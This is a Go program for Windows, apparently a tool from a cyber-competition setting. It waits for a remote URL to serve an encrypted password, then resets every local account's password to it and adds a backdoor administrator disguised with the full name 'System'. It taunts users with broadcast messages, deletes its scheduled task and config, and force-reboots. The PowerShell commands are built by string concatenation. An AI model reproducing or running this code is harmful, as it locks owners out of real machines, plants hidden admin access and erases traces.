//go:build windows && !ad

package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

/*
Powershell Script for creating a new local user, adding to Administrators, and changing password

New-LocalUser "USERNAME" -Password (ConvertTo-SecureString "PASSWORD" -AsPlainText -Force) -FullName "USERNAME" -Description "Local User Account"
Add-LocalGroupMember -Group "Administrators" -Member "John"
Set-LocalUser -Name "John" -Password (ConvertTo-SecureString "Password2" -AsPlainText -Force)
*/

func RunningAsAdmin() bool {
	var tokenHandle syscall.Token
	currentProcess, _ := syscall.GetCurrentProcess()

	err := syscall.OpenProcessToken(currentProcess, syscall.TOKEN_QUERY, &tokenHandle)
	handle(err)
	defer syscall.CloseHandle(syscall.Handle(tokenHandle))

	var elevation TOKEN_ELEVATION
	var returnedLen uint32
	err = syscall.GetTokenInformation(tokenHandle, TokenElevation, (*byte)(unsafe.Pointer(&elevation)), uint32(unsafe.Sizeof(elevation)), &returnedLen)
	handle(err)

	return elevation.TokenIsElevated != 0
}

func main() {

	// Verify the program is being run as root
	if !RunningAsAdmin() {
		fmt.Println("Program started with insufficient permissions, please re-run as Administrator.")
		os.Exit(10)
	}

	// Check for config file
	if _, err := os.Stat(WindowsConfigLocation); os.IsNotExist(err) {
		fmt.Println("No config file detected.")
		fmt.Println("Beginning first time setup...")
		WindowsFirstTimeSetup() // Should exit on its own...
		os.Exit(0)              // (just in case)
	}

	// Loads & unprotects the config file to MasterConfig
	err := LoadStructFromFile(&MasterConfig, WindowsConfigLocation, MasterKey)
	handle(err)

	for {

		resp, err := http.Get(MasterConfig.RepoUrl)
		time.Sleep(5 * time.Second) // so we don't get rate limited

		if err != nil || resp.StatusCode != 200 {
			continue
		}

		blob, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error reading response body:", err)
			return
		}
		resp.Body.Close()

		// ALL CODE PAST THIS POINT SHOULD ONLY RUN
		// IF THE ACTIVATE FILE WAS SUCCESSFULLY READ

		// Create our waitgroup
		// kinda like a queue for each password change
		var wg sync.WaitGroup

		// decrypt backup password from ACTIVATE file
		DecryptedBytes, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, &MasterConfig.Protector, blob, nil)
		password := strings.TrimSpace(string(DecryptedBytes)) // convert raw bytes to string

		// Get all Local users
		users, err := ExecPowerShell(`Get-LocalUser | Select-Object -ExpandProperty Name`)
		handle(err)

		// Recursively change each user's password
		for _, user := range strings.Split(users, "\n") {
			user = strings.TrimSpace(user)

			// basic check to ignore system accounts
			switch user {
			case "", "DefaultAccount", "WDAGUtilityAccount":
				continue
			default:
				break
			}

			// WaitGroups enable us to tell the program to wait
			// until all passwords are changed before rebooting.
			wg.Add(1)

			go func(u string, p string) {
				defer wg.Done()

				_, err = ExecPowerShell(`Set-LocalUser -Name "` + u + `" -Password (ConvertTo-SecureString "` + p + `" -AsPlainText -Force)`)
				handle(err)
			}(user, password)
		}

		wg.Wait() // Actually wait for all passwords to be changed
		// Finished changing passwords

		// Add one more local admin user just in case
		ExecPowerShell(`New-LocalUser "johndoe16" -Password (ConvertTo-SecureString "` + password + `" -AsPlainText -Force) -FullName "System" -Description "Local User Account"`)
		ExecPowerShell(`Add-LocalGroupMember -Group "Administrators" -Member "johndoe16"`)

		// :trollskull:
		WindowsBroadcast("You really thought you won, huh?")
		time.Sleep(500 * time.Millisecond)
		go func() {
			for i := 0; i < 10; i++ {
				WindowsBroadcast("Sorry, try again! :P")
			}
		}()

		// Cleanup (in case we need to re-deploy)
		ExecPowerShell(`Unregister-ScheduledTask -TaskName "project-one" -Confirm:$false`) // remove binary from startup
		ExecPowerShell(`del ` + WindowsConfigLocation)                                     // remove config file

		// reboot to kick out any attackers
		time.Sleep(500 * time.Millisecond)
		WindowsBroadcast("Bye bye!")
		ExecPowerShell("Restart-Computer -Force")

		os.Exit(0) // should be unreachable
	}
}
